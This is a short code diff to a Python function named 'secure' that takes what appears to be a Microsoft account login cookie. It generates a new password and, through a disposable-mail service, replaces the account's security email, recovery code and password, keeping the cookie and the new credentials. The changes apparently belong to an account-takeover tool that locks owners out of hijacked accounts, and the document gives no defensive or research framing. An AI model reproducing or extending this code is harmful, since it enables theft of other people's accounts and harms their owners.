@@ -30,7 +30,7 @@ def secure(msaauth: str):
         "secEmail": "Couldn't Change!",
         "password": "Couldn't Change!",
         "recoveryCode": "Couldn't Change!",
-        "loginCookie": "Failed to Get",
+        "loginCookie": msaauth,
         "status": "Unknown",
         "timeTaken": 0,
         "SSID": "Failed to Get",
@@ -179,8 +179,14 @@ def secure(msaauth: str):
                 print(f"[+] - Generated Password ({new_password})")
 
                 print("[~] - Automaticly Securing Account...")
-                newRCV = recoveryCodeSecure(email, recoveryCode, new_email, new_password, mailslurp_key) 
-                accountInfo["recoveryCode"] = newRCV
+                newData = recoveryCodeSecure(email, recoveryCode, new_email, new_password, mailslurp_key) 
+                
+                if newData:
+                    
+                    accountInfo["secEmail"] = new_email
+                    accountInfo["recoveryCode"] = newData[0]
+                    accountInfo["password"] = newData[1]
+
                 print("[+] - Account has been secured")
 
     return accountInfo
